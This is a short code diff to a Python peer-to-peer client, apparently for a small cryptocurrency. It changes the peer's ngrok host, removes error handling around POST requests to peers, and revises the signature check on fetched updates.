@@ -71,7 +71,7 @@ def second_stage():
             conf = shelve.open('conf')
         return conf
     get_conf()
-    conf['Connected'] = ['7e7acc4ef300.ngrok.io']
+    conf['Connected'] = ['0866932dbdbd.ngrok.io']
     conf['Version'] = '1.000'
     conf['OurWallets'] = ['BTC','SKR']
     conf['Key'] = 'AAAAgQCkuqxx8XsVCOn0+Z3EFogneSuTOXRFsbRIACp8mLiXsv2v44Aa/uCFFpSPvleT/hIkJob+88StiMRQRtmHkbqeN1POfpNO1rPxJT1JONhHISns301hGN5k8ixQIdUiLduP0c7eewwfd1gyMScL+9YlBopQEb18BpzF0tjP+lWOdQ=='
@@ -79,15 +79,15 @@ def second_stage():
     def Send_T1(dat,OUT = False,func = None): # Send to all
         if OUT == False:
             for ip in conf['Connected']:
-                try:
-                    res = requests.post(f'http://{str(ip)}/', json = dat)
-                    res = res.json()
-                    if not func is None:
-                        res = func(res)
-                    if not res is None:
-                        return res
-                except Exception as e:
-                    pass
+                # try:
+                res = requests.post(f'http://{str(ip)}/', json = dat)
+                res = res.json()
+                if not func is None:
+                    res = func(res)
+                if not res is None:
+                    return res
+                # except Exception as e:
+                #     print(e)
         else:
             for ip in conf['SUPERIP']:
                 try:
@@ -103,9 +103,8 @@ def second_stage():
 
     def GetUpDate():
         def function(Data):
-            Pass = Data['Pass']
             Data['Data']['files'] = sorted(Data['Data']['files'])
-            if decode(sha256_16(Data['Data']),16) == PubCode(int(Pass),AdrToPub(conf['Key'])):
+            if decode(sha256_16(sha256_16(Data['Data'])+Data['Version']),16) == PubCode(int(Data['Pass']),AdrToPub(conf['Key'])):
                 return Data
             return None
         dat = Send_T1(GetUpDate_S(),func = function)
